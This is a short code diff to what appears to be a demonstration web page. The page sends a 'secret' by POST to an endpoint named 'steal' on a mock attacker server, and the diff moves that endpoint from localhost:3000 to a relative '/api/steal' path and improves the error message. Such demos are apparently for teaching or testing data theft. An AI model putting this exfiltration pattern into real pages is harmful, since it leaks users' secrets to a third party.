@@ -14,7 +14,7 @@
       document.getElementById('log').innerText = 'Posting secret to attacker...';
       try {
         const start = Date.now();
-        const resp = await fetch('http://localhost:3000/steal', {
+        const resp = await fetch('/api/steal', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ secret })
@@ -23,7 +23,7 @@
         const elapsed = Date.now() - start;
         document.getElementById('log').innerText = 'Response: ' + JSON.stringify(json) + ' (roundtrip ' + elapsed + 'ms)';
       } catch (err) {
-        document.getElementById('log').innerText = 'Error contacting attacker server. Is it running?';
+        document.getElementById('log').innerText = 'Error contacting attacker server: ' + err.message;
       }
     });
   </script>
